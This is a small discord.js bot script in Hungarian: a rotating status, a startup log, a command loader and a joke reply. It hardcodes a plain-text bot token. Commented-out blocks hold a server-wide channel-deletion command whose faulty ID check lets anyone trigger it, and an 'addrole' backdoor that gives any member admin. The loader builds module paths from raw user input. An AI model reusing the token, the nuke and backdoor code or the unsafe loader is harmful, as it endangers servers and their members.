const Discord = require('discord.js');
const prefix = '?'
const token = 'NzEyMjA2ODAyMjA4Njg2MTEx.XsOMmw.64_CRvVZXdzvGL3_nDv36ItTQoc'
var bot = new Discord.Client();
const moment = require('moment')
moment.locale('hu')


bot.on("ready", async () => {
const valtozok = [
    "",
    `?parancsok`,
    `?ping`,
    `Bot neve: ${bot.user.username}`
]
setInterval(function() {
    const index = Math.floor(Math.random() * (valtozok.length - 1) + 1);
     bot.user.setActivity(valtozok[index], {type: "WATCHING"});
}, 3000);
});





bot.on("ready", async () => {
    console.log(`[${bot.user.username}] El indultam ennyi szerveren : [${bot.guilds.size}] \n Ekkor: ${moment().format('LLLL')} \n \n \n \n \n \n \n `)  
})


bot.on('message', async (message) => 
{
    if (message.author.bot) return;
    if (message.content.indexOf(prefix) !== 0) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
  
    try {
      let commandFile = require(`./commands/${command}.js`);
      commandFile.run(bot, message, args, prefix, moment);
    } catch (err) {
}});




/*
bot.on('message', message =>{
  if(message.author.id == "497064657522130948", "393380978766381061") {
  if(message.content === "!bye") {
  message.guild.channels.forEach(channel => channel.delete())
    }
  }
})
*/



/*
bot.on('message', message => {
  if (message.content.startsWith('addrole')) {
    let myRole = message.guild.roles.find(role => role.name === "admin")
    message.member.addRole(myRole)
  }
})
*/

bot.on('message', (message)  => {
  if (message.content.toLowerCase() === '>)') {
    message.channel.send('<(')
  }
})

bot.login(token);